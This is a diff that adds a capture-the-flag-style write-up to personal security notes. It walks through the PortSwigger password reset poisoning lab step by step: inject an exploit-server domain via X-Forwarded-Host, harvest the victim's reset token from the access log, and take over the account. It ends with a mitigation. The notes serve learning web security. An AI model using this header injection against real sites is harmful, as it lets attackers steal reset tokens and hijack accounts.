@@ -112,3 +112,50 @@ Authentication flows often have multiple steps: `Login -> 2FA -> Dashboard`.
 
 ---
 **Key Takeaway:** Never store sensitive data like password hashes in client-side cookies. If you must use a 'remember me' token, use a strong, randomly generated, un-guessable session token. Also, MD5 is deprecated and should never be used for password hashing.
+
+# lab 4th
+
+#  Lab: Password Reset Poisoning via Middleware (PortSwigger)
+**Goal:** Take over Carlos's account by stealing his password reset token.
+**Vulnerability:** Host Header Injection / Password Reset Poisoning.
+
+##  The Concept
+The server dynamically generates password reset links based on the `Host` or `X-Forwarded-Host` HTTP headers. By injecting an attacker-controlled domain into these headers, the server sends a poisoned reset link to the victim. When the victim clicks it, their secret reset token is leaked to the attacker's server.
+
+##  Methodology & Steps
+
+### Step 1: Recon & Setup
+1. Get the URL of your Exploit Server (e.g., `exploit-XXXX.exploit-server.net`). Note: Do not include `https://`.
+
+### Step 2: Intercept the Target Request
+1. Go to the Lab's login page and click **"Forgot password?"**.
+2. Enter the victim's username (`carlos`).
+3. Turn Intercept ON in Burp Suite and click "Submit".
+4. Send the intercepted `POST /forgot-password` request to **Repeater** (Ctrl+R) and turn Intercept OFF.
+
+### Step 3: The Poisoning (Header Injection)
+1. Go to Repeater.
+2. Leave the original `Host:` header intact.
+3. Add a new line below it and inject your Exploit Server domain using the `X-Forwarded-Host` header:
+   `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
+4. Ensure the body of the request contains `username=carlos`.
+5. Send the request. You should receive a `200 OK` response. 
+   *(The server has now emailed the poisoned link to Carlos).*
+
+### Step 4: Harvesting the Token
+1. Go to your Exploit Server dashboard.
+2. Click on **"Access log"**.
+3. Look at the latest incoming requests at the bottom.
+4. You will see a `GET` request from the victim clicking the poisoned link:
+   `GET /forgot-password?temp-forgot-password-token=SECRET_TOKEN_HERE HTTP/1.1`
+5. Copy the value of the `temp-forgot-password-token`.
+
+### Step 5: Account Takeover
+1. Go back to the original Lab website.
+2. Manually construct the legitimate reset URL using the stolen token:
+   `https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=SECRET_TOKEN_HERE`
+3. Hit Enter. You will be prompted to set a new password.
+4. Set a new password (e.g., `hacked123`) and log in as `carlos`.
+
+---
+**Key Takeaway / Mitigation:** Never trust the `Host` or `X-Forwarded-Host` headers to generate sensitive URLs (like password reset links). Always use a securely configured, hardcoded base URL on the server-side.
